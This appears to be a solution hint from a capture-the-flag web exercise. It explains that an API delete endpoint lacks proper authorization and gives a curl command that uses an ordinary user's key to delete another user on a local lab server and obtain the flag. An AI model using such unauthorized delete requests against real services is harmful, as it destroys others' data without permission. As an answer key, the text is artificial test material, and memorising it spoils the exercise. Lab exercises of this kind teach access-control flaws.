💡 Hint 3: Complete Solution

The DELETE /api/users/<user_id> endpoint exists but isn't protected properly.

Step-by-step:
1. Use your regular user API key: user_key_12345
2. Send DELETE request to remove the 'target' user:
   curl -X DELETE http://localhost:4003/api/users/target -H 'API-Key: user_key_12345'

The flag will be returned in the response!
